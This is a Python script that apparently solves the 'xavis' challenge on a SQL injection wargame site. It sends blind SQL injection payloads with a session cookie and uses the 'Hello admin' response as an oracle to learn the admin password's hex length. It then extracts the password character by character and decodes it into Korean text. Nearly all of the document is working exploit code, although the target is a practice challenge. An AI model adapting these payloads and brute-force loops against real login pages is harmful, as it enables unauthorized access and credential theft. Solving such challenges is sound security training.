import requests
import string
import time

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

def string_to_binary(s):
    concat = ''
    for c in s:
        val = ord(c)
        res = ''
        while val:
            res += str(int(val%2))
            val //= 2
        res += '0'*(8-len(res))
        concat += res[::-1]
    return concat
    # return ''.join(format(ord(char), '02x') for char in s)

# print(string_to_binary('^FLAG{$'))

URL = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
SESSION_ID = "tbm4o2jsok14jk1i8n7bhcov7a"
cookies = {'PHPSESSID':SESSION_ID}
params ={'pw':''}

secret = ""
length = 0

# find length
for i in range(100):
    payload = f"'|| length(hex(pw))={i};--\t"
    params['pw'] = payload
    response = requests.get(URL,params=params, cookies=cookies)

    if "<h2>Hello admin</h2>" in response.text:
        length=i
        print(f'length of hex password is: {i}')
        break

for i in range(length+1):
    for c in string.digits+string.ascii_letters:
        # guess_pass = (secret+c).replace("_", r"\_")
        # binary = string_to_binary(guess_pass)
        # hex = string_to_hex(guess_pass)
        payload = f"'||substr(hex(pw),{i},1)='{c}'--\t"
        
        # print(f"{c}: {payload}")
        params['pw'] = payload
        # print(c)
        response = requests.get(URL,params=params, cookies=cookies)
        # print(response.text)
        
        if '<h2>Hello admin</h2>' in response.text:
            i += 1      
            secret += c
            print("password: "+secret.ljust(length, '*'))
            break


# Hex string
hex_string = secret

# Split the hex string into 8-digit segments
segments = [hex_string[i:i+8] for i in range(0, len(hex_string), 8)]

# Convert each segment to a Korean character
korean_chars = []
for segment in segments:
    unicode_value = int(segment, 16)  # Convert hex to integer
    korean_chars.append(chr(unicode_value))  # Convert integer to character

# Join the characters into a single string
korean_text = ''.join(korean_chars)

print("Korean text:", korean_text)
